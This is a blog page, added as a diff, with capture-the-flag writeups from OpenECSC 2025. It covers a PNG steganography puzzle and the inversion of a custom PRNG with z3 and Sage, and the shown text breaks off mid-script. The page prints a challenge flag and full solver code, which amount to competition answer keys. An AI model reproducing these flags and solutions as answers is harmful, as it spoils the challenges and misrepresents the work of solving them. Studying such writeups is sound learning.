@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="/static/favicon.ico" type="image/x-icon">
+
+  <link rel="stylesheet" type="text/css" href="/static/asciinema-player.css" />
+  <script>MathJax = {tex: {inlineMath: [["$", "$"]], displayMath: [["$$", "$$"]], processEscapes: !1}}</script>
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+
+  <style>
+    /* HLJS CODE HIGHLIGHTING */
+    pre code.hljs {
+      display: block;
+      overflow-x: auto;
+      padding: 1em
+    }
+
+    code.hljs {
+      padding: 3px 5px
+    }
+
+    .hljs {
+      background: #fefefe;
+      color: #545454
+    }
+
+    .hljs-comment,
+    .hljs-quote {
+      color: #696969
+    }
+
+    .hljs-deletion,
+    .hljs-name,
+    .hljs-regexp,
+    .hljs-selector-class,
+    .hljs-selector-id,
+    .hljs-tag,
+    .hljs-template-variable,
+    .hljs-variable {
+      color: #d91e18
+    }
+
+    .hljs-attribute,
+    .hljs-built_in,
+    .hljs-link,
+    .hljs-literal,
+    .hljs-meta,
+    .hljs-number,
+    .hljs-params,
+    .hljs-type {
+      color: #aa5d00
+    }
+
+    .hljs-addition,
+    .hljs-bullet,
+    .hljs-string,
+    .hljs-symbol {
+      color: green
+    }
+
+    .hljs-section,
+    .hljs-title {
+      color: #007faa
+    }
+
+    .hljs-keyword,
+    .hljs-selector-tag {
+      color: #7928a1
+    }
+
+    .hljs-emphasis {
+      font-style: italic
+    }
+
+    .hljs-strong {
+      font-weight: 700
+    }
+
+    @media screen and (-ms-high-contrast:active) {
+
+      .hljs-addition,
+      .hljs-attribute,
+      .hljs-built_in,
+      .hljs-bullet,
+      .hljs-comment,
+      .hljs-link,
+      .hljs-literal,
+      .hljs-meta,
+      .hljs-number,
+      .hljs-params,
+      .hljs-quote,
+      .hljs-string,
+      .hljs-symbol,
+      .hljs-type {
+        color: highlight
+      }
+
+      .hljs-keyword,
+      .hljs-selector-tag {
+        font-weight: 700
+      }
+    }
+
+    /* HLJS CODE HIGHLIGHTING END */
+
+    header div a::before {
+      content: '';
+      display: block;
+      position: absolute;
+      bottom: 14%;
+      left: 0;
+      width: 100%;
+      height: 40%;
+      transform: rotate(-1deg);
+      background-color: orange;
+      z-index: -1;
+      opacity: .3;
+      transition: opacity .2s ease-in-out;
+    }
+
+    header div a:hover::before {
+      opacity: .8;
+    }
+
+    header div a {
+      font-size: 1.8rem;
+      display: inline-block;
+      position: relative;
+      text-decoration: none;
+      color: inherit;
+    }
+
+    header {
+      margin-top: 1rem;
+    }
+
+    header>div {
+      text-align: center;
+    }
+
+    body {
+      padding: 0 1rem;
+      margin: 0 auto;
+      color: #333333;
+      max-width: 36rem;
+      line-height: 1.55;
+    }
+
+    @media screen and (min-width:70ch) {
+      main {
+        word-break: auto-phrase;
+        text-align: justify;
+        text-justify: inter-character;
+        hyphens: auto;
+        hyphenate-limit-lines: 2;
+      }
+    }
+
+    /* what follows are common sense defaults for all pages that inherit this layout.html */
+    h1 {
+      font-size: 2.25rem;
+      line-height: 2.5rem;
+      text-align: center;
+    }
+
+    ul,
+    ol {
+      text-align: left;
+    }
+
+    hr {
+      margin: 32px 0;
+    }
+
+    li {
+      margin: 4px 0;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      line-height: 1.2;
+    }
+
+    /* From https://developer.mozilla.org/en-US/docs/Web/HTML/Element/kbd */
+    kbd>kbd {
+      text-indent: 0;
+      background-color: #eee;
+      border-radius: 3px;
+      border: 1px solid #b4b4b4;
+      box-shadow:
+        0 1px 1px rgba(0, 0, 0, 0.2),
+        0 2px 0 0 rgba(255, 255, 255, 0.7) inset;
+      color: #333;
+      display: inline-block;
+      font-size: 0.9em;
+      font-weight: 700;
+      line-height: 1;
+      padding: 2px 4px;
+      white-space: nowrap;
+    }
+
+    aside {
+      border-left: 2px solid gray;
+      border-radius: 2px;
+      padding-left: 16px;
+      margin: 0;
+      margin-left: 32px;
+    }
+
+    code,
+    pre {
+      font-family: ui-monospace, 'Cascadia Code', 'Source Code Pro', Menlo, Consolas, 'DejaVu Sans Mono', monospace !important;
+      overflow-y: hidden;
+      hyphens: auto;
+    }
+
+    :not(pre)>code {
+      font-size: 90%;
+    }
+
+    p+p {
+      margin-top: 1.3em;
+    }
+
+    pre {
+      border-radius: 8px;
+      background-color: #f2f2f2;
+      border: 1px solid #bfbfbf;
+      padding: 4px 7px;
+      overflow-x: auto;
+      font-size: .8rem;
+    }
+
+    .img+pre {
+      margin-top: 1rem;
+    }
+
+    pre:has(+.img) {
+      margin-bottom: 1rem;
+    }
+
+    [id^="asciinema-cast-"] {
+      max-width: 100%;
+      border-radius: 8px;
+      height: min-content;
+      display: block;
+      margin: 0 auto;
+    }
+
+    img {
+      max-width: 100%;
+      border-radius: 8px;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .hljs-meta.prompt_ {
+      user-select: none;
+    }
+
+
+    summary {
+      cursor: pointer;
+      user-select: none;
+
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      margin-bottom: 20px;
+    }
+
+    details>summary::before {
+      content: '>';
+      font-weight: 700;
+      padding-right: 10px;
+    }
+
+    details[open]>summary::before {
+      content: '^';
+    }
+
+    summary::after {
+      content: "";
+      flex-grow: 1;
+      height: 1px;
+      background-color: #333;
+      margin-left: 10px;
+    }
+
+    .code-preview.collapsed {
+      position: relative;
+    }
+
+    .code-preview.collapsed pre {
+      max-height: 300px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .code-preview.collapsed pre::after {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 350px;
+      background: linear-gradient(to top, rgba(0,0,0,0.3) 25%, rgba(0,0,0,0.12) 50%, rgba(0,0,0,0.0) 100%);
+      pointer-events: none;
+    }
+
+    .code-preview .expand-btn {
+      position: absolute;
+      left: 50%;
+      bottom: 10%;
+      transform: translate(-50%, 10%);
+      border: 1px solid black;
+      border-radius: 4px;
+      background: none;
+      background-color: rgba(239, 239, 239, 0.7);
+      padding: 8px;
+      width: 180px;
+    }
+
+    .code-preview .expand-btn:hover {
+      background-color: rgba(239, 239, 239);
+    }
+
+    .code-preview:not(.collapsed) .expand-btn {
+      position: sticky;
+      left: 50%;
+      transform: translate(-50%);
+    }
+  </style><title>OpenECSC 2025 Writeups - Kevin Cao</title>
+<meta name="description" content="YELLOW" />
+<style>
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    margin-top: 32px;
+    margin-bottom: 12px;
+    margin-left: -28px;
+    text-decoration: underline;
+  }
+
+  @media (min-width: 42rem) {
+    pre {
+      margin-left: -2rem;
+      width: calc(100% + 4rem);
+    }
+  }
+
+  @media (min-width: 42rem) {
+    img {
+      margin-left: -2rem;
+	  max-width: calc(100% + 4rem) !important;
+      width: calc(100% + 4rem);
+    }
+  }
+
+  @media (min-width: 42rem) {
+	[id^="asciinema-cast-"] {
+      margin-left: -2rem;
+	  max-width: calc(100% + 4rem) !important;
+      width: calc(100% + 4rem);
+    }
+  }
+
+  header>h1 {
+    color: #333;
+    padding: 0 1rem;
+    text-align: center;
+  }
+</style></head>
+
+<body><header><div>
+      <a href="/">back to homepage</a>
+    </div></header>
+
+  <main><article>
+  <header>
+    <h1>OpenECSC 2025 Writeups</h1>
+    <div style="padding-bottom:1rem; text-align:center"><time>Oct 12, 2025</time></div>
+  </header>
+  <h3>yellow</h3><pre >by NoRelect
+
+Dedicated this challenge to a person that I love whose favorite color is yellow :)</pre><p>We are given a single file <code>yellow.png</code>. The length of the chunks are suspicious. We act on this suspicion and get the flag.</p><pre ><span class="hljs-keyword">from</span> png <span class="hljs-keyword">import</span> Png
+
+png_file = Png.from_file(<span class="hljs-string">&#x27;/home/kjc/Downloads/yellow/yellow.png&#x27;</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c.<span class="hljs-built_in">len</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> png_file.chunks))
+<span class="hljs-comment"># flag: openECSC&lbrace;W3_4l1_l1v3_1n_4_y3ll0w_subm4r1n3&rbrace;</span></pre><h3>scrambled-randomness</h3><pre >by Dimitris-Toulis
+
+I wanted to use a one-time pad, but I didn&#039;t have enough randomness, so I scrambled it to create more!</pre><p>We are given this:</p><pre ><span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> PRNG <span class="hljs-keyword">import</span> PRNG
+
+flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[::-<span class="hljs-number">1</span>]
+
+prng = PRNG(os.urandom(<span class="hljs-number">8</span>))
+ciphertext = <span class="hljs-built_in">bytes</span>([m ^ k <span class="hljs-keyword">for</span> m,k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(flag,prng)])
+
+<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(ciphertext.<span class="hljs-built_in">hex</span>())</pre><p>And the PRNG implementation:</p><div class="code-preview collapsed" id="1"><pre ><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+
+MASK64 = ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) - <span class="hljs-number">1</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">rotr</span>(<span class="hljs-params">x, n</span>):
+	<span class="hljs-keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="hljs-number">64</span> - n))) &amp; MASK64
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">clmul</span>(<span class="hljs-params">a, b</span>):
+	res = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):
+		<span class="hljs-keyword">if</span> (a &gt;&gt; i) &amp; <span class="hljs-number">1</span>:
+			res ^= b &lt;&lt; i
+	<span class="hljs-keyword">return</span> res &amp; MASK64
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">weird_poly</span>(<span class="hljs-params">x, coef</span>):
+	y, p = coef[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(coef)):
+		p = clmul(~p,x)
+		y ^= clmul(coef[i],p)
+	<span class="hljs-keyword">return</span> y
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">make_scramble_matrix</span>(<span class="hljs-params">n, k</span>):
+	k %= <span class="hljs-number">256</span>
+	m = np.zeros((<span class="hljs-number">8</span>,<span class="hljs-number">8</span>))
+
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):
+		m[i, i] = (<span class="hljs-number">2</span>*((n % <span class="hljs-number">6</span>) + k + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>)
+		
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):
+		m[i, (i-<span class="hljs-number">1</span>)%<span class="hljs-number">8</span>] = <span class="hljs-number">2</span>*((<span class="hljs-number">5</span> - n) % <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>
+
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):
+		m[i, (i+<span class="hljs-number">1</span>)%<span class="hljs-number">8</span>] = -<span class="hljs-number">1</span> * (<span class="hljs-number">1</span> + <span class="hljs-number">2</span>*(n % <span class="hljs-number">4</span>)) + <span class="hljs-number">2</span>*k
+
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):
+		m[i, n % <span class="hljs-number">8</span>] += <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> (m[i, n % <span class="hljs-number">8</span>] == <span class="hljs-number">0</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">2</span>
+		
+	<span class="hljs-keyword">return</span> m
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">PRNG</span>:
+	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):
+		<span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(seed) == <span class="hljs-number">8</span>
+		self.state = <span class="hljs-built_in">int</span>.from_bytes(seed)
+		self.t = <span class="hljs-number">0</span>
+
+	<span class="hljs-keyword">def</span> <span class="hljs-title function_">scramble</span>(<span class="hljs-params">self</span>):
+		state = self.state
+
+		state ^= rotr(state, <span class="hljs-number">7</span>)
+
+		k = clmul(state, MASK64) &gt;&gt; <span class="hljs-number">63</span>
+		vec = np.array(<span class="hljs-built_in">list</span>(state.to_bytes(<span class="hljs-number">8</span>)))
+		matrix = make_scramble_matrix(self.t // <span class="hljs-number">8</span> + (<span class="hljs-number">1</span>-k) * (-<span class="hljs-number">1</span>), k * state - <span class="hljs-number">1</span>)
+		state = <span class="hljs-built_in">int</span>.from_bytes((matrix @ vec).astype(np.uint8).tobytes())
+
+		state ^= rotr(state, <span class="hljs-number">17</span>) ^ rotr(state, <span class="hljs-number">42</span>) ^ rotr(state, <span class="hljs-number">24</span>) ^ rotr(state, <span class="hljs-number">53</span>)
+		
+		state = weird_poly(state, [<span class="hljs-number">0x4e1b88c5615038ae</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>])
+		state = clmul(state, <span class="hljs-number">0xa90fd521eeab98d3</span>)
+
+		self.state = state
+
+	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):
+		<span class="hljs-keyword">if</span> self.t % <span class="hljs-number">8</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> self.t != <span class="hljs-number">0</span>:
+			self.scramble()
+
+		value = self.state.to_bytes(<span class="hljs-number">8</span>)[self.t % <span class="hljs-number">8</span>]
+		self.t += <span class="hljs-number">1</span>
+		<span class="hljs-keyword">return</span> (value * <span class="hljs-number">55</span>) % <span class="hljs-number">256</span>
+	
+	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):
+		<span class="hljs-keyword">return</span> self</pre><button class="expand-btn" onclick="(()=>{const p=document.getElementById('1');const btn=p.querySelector('.expand-btn');if(p.classList.contains('collapsed')){p.classList.remove('collapsed');btn.textContent='Show Less'}else{p.classList.add('collapsed');btn.textContent='Show More';p.scrollIntoView({behavior:'instant',block:'start'})}})()">Show More</button></div><p>We first need to invert the <code>scramble</code> function. This is not much trouble, our strategy is to step-by-step, modelling each operation on the state and inverting it. This is easy and requires little creative thinking.</p><pre ><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *
+
+MASK64 = (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) - <span class="hljs-number">1</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">clmul_z3_b</span>(<span class="hljs-params">a, B</span>):
+    res = BitVecVal(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):
+        bit = Extract(i, i, a)
+        res = res ^ If(bit == BitVecVal(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>), BitVecVal(B &lt;&lt; i, <span class="hljs-number">64</span>), BitVecVal(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>))
+    <span class="hljs-keyword">return</span> res &amp; MASK64
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">clmul_z3_a</span>(<span class="hljs-params">A, b</span>):
+    res = BitVecVal(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):
+        <span class="hljs-keyword">if</span> (A &gt;&gt; i) &amp; <span class="hljs-number">1</span>:
+            res = res ^ (b &lt;&lt; i)
+    <span class="hljs-keyword">return</span> res &amp; MASK64
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">clmul_z3</span>(<span class="hljs-params">a, b</span>):
+    res = BitVecVal(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):
+        bit = Extract(i, i, a)
+        res = res ^ If(bit == BitVecVal(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>), b &lt;&lt; i, BitVecVal(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>))
+    <span class="hljs-keyword">return</span> res &amp; MASK64
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">all_smt</span>(<span class="hljs-params">s, initial_terms</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">block_term</span>(<span class="hljs-params">s, m, t</span>):
+        s.add(t != m.<span class="hljs-built_in">eval</span>(t, model_completion=<span class="hljs-literal">True</span>))
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fix_term</span>(<span class="hljs-params">s, m, t</span>):
+        s.add(t == m.<span class="hljs-built_in">eval</span>(t, model_completion=<span class="hljs-literal">True</span>))
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">all_smt_rec</span>(<span class="hljs-params">terms</span>):
+        <span class="hljs-keyword">if</span> sat == s.check():
+            m = s.model()
+            <span class="hljs-keyword">yield</span> m
+            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(terms)):
+                s.push()
+                block_term(s, m, terms[i])
+                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):
+                    fix_term(s, m, terms[j])
+                <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> all_smt_rec(terms[i:])
+                s.pop()
+    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> all_smt_rec(<span class="hljs-built_in">list</span>(initial_terms))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">invert_weird_poly</span>(<span class="hljs-params">target_state, coef=[<span class="hljs-number">0x4E1B88C5615038AE</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]</span>):
+    x = BitVec(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">64</span>)
+    y = BitVec(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">64</span>)
+    p = BitVec(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-number">64</span>)
+    s = Solver()
+    s.add(y == BitVecVal(coef[<span class="hljs-number">0</span>], <span class="hljs-number">64</span>))
+
+    p = clmul_z3_a(-<span class="hljs-number">2</span>, x)
+    y = y ^ clmul_z3_a(coef[<span class="hljs-number">1</span>], p)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(coef)):
+        p = clmul_z3(~p, x)
+        y = y ^ clmul_z3_a(coef[i], p)
+    s.add(y == BitVecVal(target_state, <span class="hljs-number">64</span>))
+    <span class="hljs-keyword">return</span> [m[x].as_long() <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_smt(s, [x, y, p])]
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_state</span>(<span class="hljs-params">state, _t_pm</span>):
+    <span class="hljs-comment"># step 1: clmul invert</span>
+    a = BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">64</span>)
+    s = Solver()
+    s.add(clmul_z3_b(a, <span class="hljs-number">0xA90FD521EEAB98D3</span>) == BitVecVal(state, <span class="hljs-number">64</span>))
+    ms = [m[a].as_long() <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_smt(s, [a])]
+    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ms) == <span class="hljs-number">1</span>
+    (state,) = ms
+
+    <span class="hljs-comment"># step 2: weird_poly invert</span>
+    ms = invert_weird_poly(state)
+    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ms) == <span class="hljs-number">1</span>
+    (state,) = ms
+
+    <span class="hljs-comment"># step 3: rotr invert</span>
+    a = BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">64</span>)
+    s = Solver()
+    s.add(
+        a
+        ^ RotateRight(a, <span class="hljs-number">17</span>)
+        ^ RotateRight(a, <span class="hljs-number">42</span>)
+        ^ RotateRight(a, <span class="hljs-number">24</span>)
+        ^ RotateRight(a, <span class="hljs-number">53</span>)
+        == state
+    )
+    ms = [m[a].as_long() <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_smt(s, [a])]
+    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ms) == <span class="hljs-number">1</span>
+    (state,) = ms
+
+    <span class="hljs-comment"># step 4: matrix invert</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_invert</span>(<span class="hljs-params">state</span>):
+        <span class="hljs-keyword">def</span> <span class="hljs-title function_">make_scramble_matrix</span>(<span class="hljs-params">n</span>):
+            ms = []
+            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
+                m = np.zeros((<span class="hljs-number">8</span>, <span class="hljs-number">8</span>))
+
+                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):
+                    m[i, i] = <span class="hljs-number">2</span> * ((n % <span class="hljs-number">6</span>) + k + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>
+
+                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):
+                    m[i, (i - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>] = <span class="hljs-number">2</span> * ((<span class="hljs-number">5</span> - n) % <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>
+
+                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):
+                    m[i, (i + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>] = -<span class="hljs-number">1</span> * (<span class="hljs-number">1</span> + <span class="hljs-number">2</span> * (n % <span class="hljs-number">4</span>)) + <span class="hljs-number">2</span> * k
+
+                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):
+                    m[i, n % <span class="hljs-number">8</span>] += <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> (m[i, n % <span class="hljs-number">8</span>] == <span class="hljs-number">0</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">2</span>
+
+                ms.append(m)
+            <span class="hljs-keyword">return</span> ms
+
+        <span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> matrix, vector, Integers
+        R = Integers(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)
+        <span class="hljs-keyword">def</span> <span class="hljs-title function_">python_to_sage_mat</span>(<span class="hljs-params">R, m</span>):
+            <span class="hljs-keyword">return</span> matrix(R, [[R(<span class="hljs-built_in">int</span>(x)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> row] <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> m])
+        <span class="hljs-keyword">def</span> <span class="hljs-title function_">python_to_sage_vec</span>(<span class="hljs-params">R, v</span>):
+            <span class="hljs-keyword">return</span> vector(R, [R(<span class="hljs-built_in">int</span>(x)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> v])
+        <span class="hljs-keyword">def</span> <span class="hljs-title function_">sage_to_python_vec</span>(<span class="hljs-params">v</span>):
+            <span class="hljs-keyword">return</span> [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> v]
+
+        state = np.array(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, state.to_bytes(<span class="hljs-number">8</span>)))).astype(np.uint8)
+        state = python_to_sage_vec(R, state)
+        res = <span class="hljs-built_in">set</span>()
+        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> &lbrace;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&rbrace;:
+            <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> make_scramble_matrix(_t_pm + (<span class="hljs-number">1</span> - k) * (-<span class="hljs-number">1</span>)):
+                m = python_to_sage_mat(R, m)
+                sol = sage_to_python_vec(m.solve_right(state))
+                res.add(<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">list</span>(sol))))
+        <span class="hljs-keyword">return</span> res
+    possible = matrix_invert(state)
+
+    <span class="hljs-comment"># step 5: final rotr</span>
+    result = <span class="hljs-built_in">set</span>()
+    <span class="hljs-keyword">for</span> state <span class="hljs-keyword">in</span> possible:
+        a = BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">64</span>)
+        s = Solver()
+        s.add(a ^ RotateRight(a, <span class="hljs-number">7</span>) == state)
+        ms = [m[a].as_long() <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_smt(s, [a])]
+        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> ms:
+            result.add(m)
+    <span class="hljs-keyword">return</span> result</pre><p>Finally,</p><pre ><span class="hljs-keyword">from</span> state <span class="hljs-keyword">import</span> *
+
+x = <span class="hljs-built_in">bytes</span>.fromhex(
+    <span class="hljs-string">&#x27;9b46dbc7987008ee4c0e1843b7479393fdad7ef9fad259a42900b4d04a347bd0c5400726d499d0e55b670c452eb61052e8c07045205abbf3be213d2c71d0798b96c5fad52cae9a267e69376925183dcdae0a3ca03d4e8d2b&#x27;</span> <span class="hljs-comment"># given by problem, from output.txt</span>
+)
+last_state = [a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x[-<span class="hljs-number">8</span>:], <span class="hljs-string">b&#x27;CSCEnepo&#x27;</span>)]
+
+<span class="hljs-comment"># first, solve for the state</span>
+v = [BitVec(<span class="hljs-string">f&#x27;v<span class="hljs-subst">&lbrace;i&rbrace;</span>&#x27;</span>, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]
+s = Solver()
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+    s.add((v[i] * <span class="hljs-number">55</span>) % <span class="hljs-number">256</span> == last_state[i])
+states = [[m[d].as_long() <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> v] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_smt(s, v)]
+<span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(states) == <span class="hljs-number">1</span>
+last_state = <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-built_in">bytes</span>(states[<span class="hljs-number">0</span>]))
+
+<span class="hljs-comment"># now, unwind</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">unwind</span>(<span class="hljs-params">last_state, t</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_printable</span>(<span class="hljs-params">s: <span class="hljs-built_in">bytes</span></span>):
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-number">32</span> &lt;= c &lt;= <span class="hljs-number">126</span>):
+                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+
+    <span class="hljs-keyword">if</span> t &lt;= <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> [[]]
+
+    sols = []
+    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> solve_state(last_state, t):
+        key = <span class="hljs-built_in">bytes</span>((s.to_bytes(<span class="hljs-number">8</span>)[i % <span class="hljs-number">8</span>] * <span class="hljs-number">55</span>) % <span class="hljs-number">256</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>))
